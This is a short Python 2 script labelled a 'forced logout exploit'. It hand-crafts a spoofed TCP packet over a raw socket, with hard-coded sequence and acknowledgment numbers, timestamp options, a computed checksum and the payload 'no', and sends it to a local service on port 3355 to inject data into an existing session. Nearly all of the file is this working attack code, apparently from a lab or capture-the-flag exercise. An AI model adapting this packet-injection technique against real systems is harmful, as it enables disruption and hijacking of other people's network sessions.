
# standard
import socket
import struct

####################################
# forced logout exploit
####################################

# from http://commandline.org.uk/python/how-to-find-out-ip-address-in-python/
def get_network_ip():
    """Returns LAN IP."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    return s.getsockname()[0]

local = get_network_ip()
remote = local

S_ADDR = '127.0.0.1' # spoofed source IP address
S_PORT = 62269 # source port

D_ADDR = '127.0.0.1' # destination IP address
D_PORT = 3355 # destination port


s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
# s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# r = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
# r.bind((local, 5000))
# s.sendto("test", (D_ADDR, D_PORT))

# from/to 127.0.0.1
# from/to 60000/3333

####################################

def carry_around_add(a, b):
    c = a + b
    return (c & 0xffff) + (c >> 16)

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i+1]) << 8)
        s = carry_around_add(s, w)
    return ~s & 0xffff

####################################

############################
# TCP PACKET SPECIFICATION #
############################
# 0                   1                   2                   3
# 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |          Source Port          |       Destination Port        |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                        Sequence Number                        |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                    Acknowledgment Number                      |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |  Data |           |U|A|P|R|S|F|                               |
# | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
# |       |           |G|K|H|T|N|N|                               |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |           Checksum            |         Urgent Pointer        |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                    Options                    |    Padding    |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                             data                              |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

tcp_packet = bytearray()
tcp_packet += struct.pack("!H", S_PORT) # source port
tcp_packet += struct.pack("!H", D_PORT) # dest port
tcp_packet += struct.pack("!L", 0xfb81b4cb) # seq num
tcp_packet += struct.pack("!L", 0x0ff52a6b) # ack num
tcp_packet += struct.pack("!H", (8 << 12) + 0b011000)
tcp_packet += struct.pack("!H", 0xffff) # window size
tcp_packet += struct.pack("!H", 0x0000) # checksum!!!  (default 0)
tcp_packet += struct.pack("!H", 0) # urgent pointer
#
tcp_packet += struct.pack("!B", 1) # NOP
tcp_packet += struct.pack("!B", 1) # NOP
tcp_packet += struct.pack("!B", 0x8) # timestamp option
tcp_packet += struct.pack("!B", 0xa) # length
tcp_packet += struct.pack("!L", 0x32ff125f) # t1
tcp_packet += struct.pack("!L", 0x32fbbd50) # t2
#
tcp_packet += "no"

tcp_length = len(tcp_packet)

ip_pseudo_header = ''
ip_pseudo_header += struct.pack("!BBBB", 127, 0, 0, 1) # src
ip_pseudo_header += struct.pack("!BBBB", 127, 0, 0, 1) # dst
ip_pseudo_header += struct.pack("!B", 0) # zeros
ip_pseudo_header += struct.pack("!B", 6) # protocol (TCP = 6)
ip_pseudo_header += struct.pack("!H", tcp_length) # TCP length

pseudo_packet = ip_pseudo_header + tcp_packet

cs = checksum(str(pseudo_packet))

tcp_packet[16:18] = struct.pack("!H", cs)

print s.sendto(tcp_packet, (D_ADDR, D_PORT))
